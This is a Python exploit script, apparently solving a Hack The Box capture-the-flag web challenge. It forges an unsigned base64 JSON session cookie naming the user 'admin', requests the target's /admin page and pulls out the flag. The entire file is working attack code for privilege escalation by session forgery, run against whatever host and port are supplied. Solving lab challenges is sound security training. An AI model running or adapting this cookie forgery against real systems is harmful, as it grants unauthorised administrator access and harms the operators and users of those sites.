#!/usr/bin/env python3
import base64
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# The session cookie is base64 JSON with no signature, so the server trusts
# whatever user it names. Setting user to "admin" opens /admin, which shows the
# dashboard and the flag in its "Internal only" banner.


def admin_cookie():
    raw = json.dumps({"user": "admin"}, separators=(",", ":")).encode()
    return "session=" + urllib.parse.quote(base64.b64encode(raw).decode(), safe="")


def get(url, cookie):
    req = urllib.request.Request(url, headers={"Cookie": cookie})
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read().decode(errors="replace")
    except urllib.error.HTTPError as err:
        return err.read().decode(errors="replace")


def exploit(host, port):
    base = f"http://{host}:{port}"

    page = get(f"{base}/admin", admin_cookie())
    flag = re.search(r"HTB\{[^}]*\}", page)
    if not flag:
        print(page[:500])
        raise RuntimeError("flag not found on /admin")
    print(f"[+] Flag:\n{flag.group(0)}")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    exploit(sys.argv[1], int(sys.argv[2]))
